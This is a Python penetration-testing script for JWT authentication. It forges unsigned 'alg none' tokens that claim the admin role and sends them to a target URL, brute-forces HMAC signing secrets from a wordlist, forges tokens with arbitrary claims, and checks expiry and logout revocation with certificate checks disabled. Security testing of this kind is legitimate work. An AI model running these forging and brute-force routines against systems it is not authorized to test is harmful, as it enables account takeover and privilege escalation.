#!/usr/bin/env python3
"""Agent for testing JWT token security during authorized assessments."""

import jwt
import json
import sys
import hmac
import hashlib
import base64
import argparse
import requests
import urllib3
from datetime import datetime, timedelta, timezone
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def decode_jwt(token):
    """Decode and display JWT header and payload without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] Invalid JWT format (expected 3 parts)")
        return None, None

    def b64_decode(data):
        padding = 4 - len(data) % 4
        data += "=" * padding
        return base64.urlsafe_b64decode(data)

    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))

    print("[*] JWT Header:")
    print(json.dumps(header, indent=2))
    print("\n[*] JWT Payload:")
    print(json.dumps(payload, indent=2))

    if "exp" in payload:
        exp_time = datetime.fromtimestamp(payload["exp"], tz=timezone.utc)
        now = datetime.now(timezone.utc)
        if exp_time < now:
            print(f"\n  [!] Token EXPIRED at {exp_time.isoformat()}")
        else:
            remaining = exp_time - now
            print(f"\n  [+] Token expires at {exp_time.isoformat()} ({remaining} remaining)")
    return header, payload


def test_alg_none(token, target_url=None):
    """Test algorithm none attack - forge token without signature."""
    print("\n[*] Testing algorithm 'none' attack...")
    parts = token.split(".")
    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    findings = []

    for alg in ["none", "None", "NONE", "nOnE"]:
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": alg, "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload_data["role"] = "admin"
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()
        forged = f"{header}.{payload_encoded}."

        if target_url:
            try:
                resp = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"},
                                    timeout=10, verify=False)
                if resp.status_code == 200:
                    findings.append({
                        "type": "ALG_NONE", "alg_value": alg,
                        "status": resp.status_code, "severity": "CRITICAL",
                    })
                    print(f"  [!] VULNERABLE: alg={alg} accepted (status {resp.status_code})")
                else:
                    print(f"  [+] alg={alg} rejected (status {resp.status_code})")
            except requests.RequestException:
                continue
        else:
            print(f"  [*] Forged token (alg={alg}): {forged[:80]}...")
    return findings


def test_hmac_brute_force(token, wordlist_path):
    """Brute force HMAC secret using a wordlist."""
    print(f"\n[*] Brute forcing HMAC secret with {wordlist_path}...")
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    alg = header.get("alg", "HS256")

    if alg not in ("HS256", "HS384", "HS512"):
        print(f"  [-] Algorithm {alg} is not HMAC-based, skipping")
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    signature = base64.urlsafe_b64decode(parts[2] + "==")
    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]

    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            for i, line in enumerate(f):
                secret = line.strip()
                if not secret:
                    continue
                computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
                if hmac.compare_digest(computed, signature):
                    print(f"  [!] SECRET FOUND: '{secret}' (attempt {i+1})")
                    return secret
                if (i + 1) % 10000 == 0:
                    print(f"  [*] Tried {i+1} secrets...")
    except FileNotFoundError:
        print(f"  [-] Wordlist not found: {wordlist_path}")
    print("  [-] Secret not found in wordlist")
    return None


def forge_token(secret, claims, algorithm="HS256"):
    """Create a forged JWT with custom claims."""
    print(f"\n[*] Forging token with claims: {claims}")
    if "exp" not in claims:
        claims["exp"] = int((datetime.now(timezone.utc) + timedelta(hours=24)).timestamp())
    token = jwt.encode(claims, secret, algorithm=algorithm)
    print(f"  [+] Forged token: {token[:80]}...")
    return token


def test_expired_token(token, target_url):
    """Test if expired tokens are still accepted."""
    print(f"\n[*] Testing expired token acceptance...")
    parts = token.split(".")
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
    if "exp" in payload and payload["exp"] < datetime.now(timezone.utc).timestamp():
        try:
            resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"},
                                timeout=10, verify=False)
            if resp.status_code == 200:
                print(f"  [!] VULNERABLE: Expired token accepted (status {resp.status_code})")
                return [{"type": "EXPIRED_TOKEN_ACCEPTED", "severity": "HIGH"}]
            else:
                print(f"  [+] Expired token rejected (status {resp.status_code})")
        except requests.RequestException:
            pass
    else:
        print("  [*] Token not expired, skipping test")
    return []


def test_token_after_logout(token, target_url, logout_url):
    """Test if token is still valid after logout."""
    print(f"\n[*] Testing token validity after logout...")
    headers = {"Authorization": f"Bearer {token}"}
    try:
        pre = requests.get(target_url, headers=headers, timeout=10, verify=False)
        if pre.status_code != 200:
            print("  [-] Token not valid pre-logout, skipping")
            return []
        requests.post(logout_url, headers=headers, timeout=10, verify=False)
        post = requests.get(target_url, headers=headers, timeout=10, verify=False)
        if post.status_code == 200:
            print(f"  [!] VULNERABLE: Token still valid after logout")
            return [{"type": "NO_TOKEN_REVOCATION", "severity": "HIGH"}]
        else:
            print(f"  [+] Token properly revoked after logout")
    except requests.RequestException:
        pass
    return []


def check_jwks_endpoint(base_url):
    """Check for JWKS and OpenID configuration endpoints."""
    print(f"\n[*] Checking for JWKS/OIDC endpoints...")
    endpoints = [
        "/.well-known/jwks.json", "/.well-known/openid-configuration",
        "/oauth/certs", "/auth/keys", "/.well-known/keys",
    ]
    for ep in endpoints:
        url = urljoin(base_url, ep)
        try:
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code == 200:
                print(f"  [+] Found: {ep}")
                data = resp.json()
                if "keys" in data:
                    for key in data["keys"]:
                        print(f"    Key ID: {key.get('kid', 'N/A')} | Alg: {key.get('alg', 'N/A')}")
        except (requests.RequestException, json.JSONDecodeError):
            continue


def generate_report(findings, output_path):
    """Generate JWT security assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "findings": findings,
    }
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="JWT Token Security Testing Agent")
    parser.add_argument("token", help="JWT token to test")
    parser.add_argument("--target-url", help="URL to test forged tokens against")
    parser.add_argument("--base-url", help="Base URL for JWKS discovery")
    parser.add_argument("--wordlist", help="Wordlist for HMAC brute force")
    parser.add_argument("--logout-url", help="Logout URL for revocation testing")
    parser.add_argument("--forge-claims", help="JSON claims to forge (requires --secret)")
    parser.add_argument("--secret", help="Known signing secret for forging")
    parser.add_argument("-o", "--output", default="jwt_report.json")
    args = parser.parse_args()

    print("[*] JWT Token Security Assessment")
    findings = []
    header, payload = decode_jwt(args.token)
    if args.base_url:
        check_jwks_endpoint(args.base_url)
    findings.extend(test_alg_none(args.token, args.target_url))
    if args.wordlist:
        secret = test_hmac_brute_force(args.token, args.wordlist)
        if secret:
            findings.append({"type": "WEAK_HMAC_SECRET", "secret": secret, "severity": "CRITICAL"})
    if args.target_url:
        findings.extend(test_expired_token(args.token, args.target_url))
    if args.target_url and args.logout_url:
        findings.extend(test_token_after_logout(args.token, args.target_url, args.logout_url))
    if args.secret and args.forge_claims:
        claims = json.loads(args.forge_claims)
        forge_token(args.secret, claims)
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()
